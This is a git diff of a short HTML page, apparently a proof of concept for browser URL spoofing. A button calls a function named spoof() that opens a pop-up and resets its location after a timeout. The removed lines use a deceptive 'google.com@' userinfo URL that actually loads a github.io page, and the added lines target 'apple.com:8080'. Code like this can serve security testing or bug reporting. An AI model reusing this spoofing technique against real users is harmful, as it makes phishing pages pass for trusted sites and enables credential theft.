@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="spoof()">CLICK HERE HERE</button>
+<button onclick="spoof()">CLICK </button>
 
 <script>
 function spoof() {
 
     // 1) open new tab, MUST be user interaction
-    let win = window.open("https://www.google.com@umar1105.github.io/testing4040.html", "https://www.google.com@umar1105.github.io/testing4040.html");
+    let win = window.open("https://www.apple.com:8080", "https://www.apple.com:8080");
 
     if(!win) return alert("Please allow popups");
 
@@ -36,7 +36,7 @@ function spoof() {
 
     // 4) minor URL enforcement
     setTimeout(()=>{
-        try{ win.location.href = "https://www.google.com@umar1105.github.io/testing4040.html"; }catch(e){}
+        try{ win.location.href = "https://www.apple.com:8080"; }catch(e){}
     }, 10);
 
 }
